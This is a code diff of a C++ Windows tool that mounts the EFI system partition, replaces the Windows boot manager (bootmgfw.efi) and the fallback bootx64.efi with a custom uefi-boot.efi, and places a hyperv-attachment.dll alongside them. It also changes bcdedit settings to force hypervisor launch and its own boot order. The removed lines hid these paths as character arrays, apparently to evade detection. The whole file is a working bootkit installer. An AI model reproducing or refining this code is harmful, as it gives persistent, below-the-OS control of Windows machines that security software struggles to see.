@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
+#include <shlobj.h> // Để dùng SHCreateDirectoryExA
+
+#pragma comment(lib, "Shell32.lib")
 
 bool is_admin() {
     BOOL admin = FALSE;
@@ -21,13 +24,25 @@ void run_as_admin() {
 }
 
 bool aggressive_copy(const std::string& src, const std::string& dst) {
-    system(("attrib -s -h -r " + dst + " >nul 2>&1").c_str());
+    system(("attrib -s -h -r \"" + dst + "\" >nul 2>&1").c_str());
     DeleteFileA(dst.c_str());
     if (CopyFileA(src.c_str(), dst.c_str(), FALSE)) {
         std::cout << "[+] SUCCESS: Updated " << dst << std::endl;
         return true;
     }
+    std::cout << "[-] FAILED: Could not update " << dst << " (Error: " << GetLastError() << ")" << std::endl;
     return false;
+}
+
+void verify_with_api(const std::string& path) {
+    WIN32_FIND_DATAA data;
+    HANDLE h = FindFirstFileA(path.c_str(), &data);
+    if (h != INVALID_HANDLE_VALUE) {
+        std::cout << "[VERIFIED] " << data.cFileName << " | Size: " << data.nFileSizeLow << " bytes" << std::endl;
+        FindClose(h);
+    } else {
+        std::cout << "[NOT FOUND] File error: " << path << " (Error: " << GetLastError() << ")" << std::endl;
+    }
 }
 
 int main() {
@@ -36,62 +51,73 @@ int main() {
         return 0;
     }
 
-    // Silent banner
+    // Ổ B cố định theo yêu cầu
+    std::string drive_str = "B:";
 
-    system("mountvol Z: /S >nul 2>&1");
+    std::cout << "[*] Cleaning up drive " << drive_str << " (if exists)..." << std::endl;
+    system(("mountvol " + drive_str + " /D >nul 2>&1").c_str());
     Sleep(500);
+
+    std::cout << "[*] Mounting EFI to " << drive_str << "..." << std::endl;
+    system(("mountvol " + drive_str + " /S").c_str());
+    Sleep(1000);
+
+    // Kiểm tra xem ổ đã thực sự được mount chưa
+    if (GetFileAttributesA(drive_str.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        std::cout << "[-] ERROR: Failed to mount EFI partition to " << drive_str << "." << std::endl;
+        std::cout << "[!] Hay chac chan rang o B: khong bi chiem dung boi thiet bi khac." << std::endl;
+        system("pause");
+        return 1;
+    }
 
     char current_dir[MAX_PATH];
     GetCurrentDirectoryA(MAX_PATH, current_dir);
     std::string bin_path(current_dir);
     
-    char s_uefi[] = { '\\', 'u', 'e', 'f', 'i', '-', 'b', 'o', 'o', 't', '.', 'e', 'f', 'i', 0 };
-    char s_dll[] = { '\\', 'h', 'y', 'p', 'e', 'r', 'v', '-', 'a', 't', 't', 'a', 'c', 'h', 'm', 'e', 'n', 't', '.', 'd', 'l', 'l', 0 };
-    
-    std::string src_efi = bin_path + s_uefi;
-    std::string src_dll = bin_path + s_dll;
+    std::string src_efi = bin_path + "\\uefi-boot.efi";
+    std::string src_dll = bin_path + "\\hyperv-attachment.dll";
 
-    char s_ms_boot[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','b','o','o','t','m','g','f','w','.','e','f','i', 0 };
-    char s_ms_orig[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','b','o','o','t','m','g','f','w','.','o','r','i','g','i','n','a','l','.','e','f','i', 0 };
-    
-    std::string ms_boot = s_ms_boot;
-    std::string ms_orig = s_ms_orig;
-    
-    char s_fb_boot[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t','\\','b','o','o','t','x','6','4','.','e','f','i', 0 };
-    char s_fb_orig[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t','\\','b','o','o','t','x','6','4','.','o','r','i','g','i','n','a','l','.','e','f','i', 0 };
+    std::string ms_dir  = drive_str + "\\EFI\\Microsoft\\Boot";
+    std::string ms_boot = ms_dir + "\\bootmgfw.efi";
+    std::string ms_orig = ms_dir + "\\bootmgfw.original.efi";
+    std::string ms_dll  = ms_dir + "\\hyperv-attachment.dll";
 
-    std::string fb_boot = s_fb_boot;
-    std::string fb_orig = s_fb_orig;
+    std::string fb_dir  = drive_str + "\\EFI\\Boot";
+    std::string fb_boot = fb_dir + "\\bootx64.efi";
+    std::string fb_orig = fb_dir + "\\bootx64.original.efi";
 
-    // Backup and overwrite Path 1
+    // Đảm bảo cấu trúc thư mục tồn tại
+    SHCreateDirectoryExA(NULL, ms_dir.c_str(), NULL);
+    SHCreateDirectoryExA(NULL, fb_dir.c_str(), NULL);
+
+    // Backup & Copy Path 1
     if (GetFileAttributesA(ms_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        system(("attrib -s -h -r " + ms_boot + " >nul 2>&1").c_str());
         MoveFileA(ms_boot.c_str(), ms_orig.c_str());
     }
     aggressive_copy(src_efi, ms_boot);
-    
-    char s_ms_dll[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','h','y','p','e','r','v','-','a','t','t','a','c','h','m','e','n','t','.','d','l','l', 0 };
-    aggressive_copy(src_dll, s_ms_dll);
+    aggressive_copy(src_dll, ms_dll);
 
-    // Backup and overwrite Path 2
+    // Backup & Copy Path 2
     if (GetFileAttributesA(fb_boot.c_str()) != INVALID_FILE_ATTRIBUTES) {
         if (GetFileAttributesA(fb_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
-            std::cout << "[*] Backing up..." << std::endl;
-            system(("attrib -s -h -r " + fb_boot + " >nul 2>&1").c_str());
             MoveFileA(fb_boot.c_str(), fb_orig.c_str());
         }
         aggressive_copy(src_efi, fb_boot);
     } else {
-        std::cout << "[*] Creating fb..." << std::endl;
-        char s_fb_dir[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t', 0 };
-        CreateDirectoryA(s_fb_dir, NULL);
         aggressive_copy(src_efi, fb_boot);
     }
 
     system("bcdedit /set hypervisorlaunchtype auto >nul 2>&1");
-    std::cout << "\n[OK] BOOT UPDATED" << std::endl;
-    std::cout << "[!] RESTART NOW" << std::endl;
+    system("bcdedit /set {fwbootmgr} displayorder {bootmgr} /addfirst >nul 2>&1");
 
-    system("pause");
+    std::cout << "\n[OK] BOOT UPDATED. Verifying Result:" << std::endl;
+    verify_with_api(ms_boot);
+    verify_with_api(ms_dll);
+    verify_with_api(fb_boot);
+    
+    std::cout << "\n[!] RESTART NOW. Press any key to unmount and exit..." << std::endl;
+    system("pause >nul");
+
+    system(("mountvol " + drive_str + " /D >nul 2>&1").c_str());
     return 0;
 }
